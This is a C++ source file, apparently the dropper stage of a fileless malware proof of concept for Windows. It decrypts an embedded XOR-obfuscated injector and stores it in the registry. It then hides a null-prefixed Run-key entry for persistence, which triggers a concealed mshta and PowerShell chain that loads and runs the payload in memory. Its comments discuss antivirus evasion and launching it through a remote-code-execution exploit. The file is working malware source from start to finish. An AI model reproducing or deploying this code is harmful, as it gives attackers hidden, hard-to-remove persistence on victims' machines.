#include <Windows.h>
#include "../Global/NativeRegistry.h"
#include "resource.h"

// First stage: LivingOffTheLand.exe can be either started normally (double clicking EXE file), or it can be executed in memory, i.e. by a RCE exploit.
// Normal execution will likely be detected, while AV evasion is more likely with in-memory execution.

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Read Injector.exe from resources
	HRSRC injectorResource = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_INJECTOR), "EXE");
	if (!injectorResource) return 0;

	DWORD injectorSize = SizeofResource(NULL, injectorResource);
	if (injectorSize == 0) return 0;

	LPBYTE injectorResourceData = (LPBYTE)LockResource(LoadResource(NULL, injectorResource));
	if (!injectorResourceData) return 0;

	// Decrypt Injector.exe using a simple XOR algorithm
	LPBYTE injector = new BYTE[injectorSize];
	BYTE xorKey = 0x77;
	for (DWORD i = 0; i < injectorSize; i++)
	{
		injector[i] = injectorResourceData[i] ^ xorKey;
		xorKey += 5;
	}

	// Write Injector.exe into registry.
	HKEY key;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer", 0, KEY_ALL_ACCESS, &key) != ERROR_SUCCESS) return 0;
	if (RegSetValueExA(key, NULL, 0, REG_BINARY, injector, injectorSize) != ERROR_SUCCESS) return 0;

	// Startup command goes into HKCU\...\Run and has a max length of 260 (MAX_PATH).
	// powershell.exe loads Injector.exe from registry and executes it in memory. Injector.exe is required to be written in C#! Because of the MAX_PATH restriction, there is only room to perform a
	// simple Assembly.Load().EntryPoint.Invoke() here.
	// mshta.exe is not essential. But without it, a powershell window is briefly visible. The JavaScript allows to start powershell with SW_HIDE.
	// Because mshta is wrapping powershell, which is wrapping C#, multiple layers of string escaping are required :(
	LPCWSTR startupCommand = L"mshta \"javascript:close(new ActiveXObject('WScript.Shell').run('powershell \\\"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\\\\\"Software\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\\\"',0))\"";

	// This command is for immediate execution.
	LPCSTR runCommand = "\"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Internet Explorer\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"";

	// Write startup command to registry for persistence.
	// The value HKCU\...\Run\{NULL}X contains a null character before the actual name, therefore it can only be created using the native API.
	// Viewing the Run key in regedit causes errors in the UI. However, the key remains functional. The removal tool is required to delete this value, or Sysinternals RegDelNull.
	if (!nt_cpp::SetValue(nt_cpp::GetCurrentUserPath() + L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\0X", nt_cpp::Udc(startupCommand))) return 0;

	// Start powershell that executes the Injector.
	ShellExecuteA(NULL, "open", "powershell", runCommand, NULL, SW_HIDE);

	return 0;
}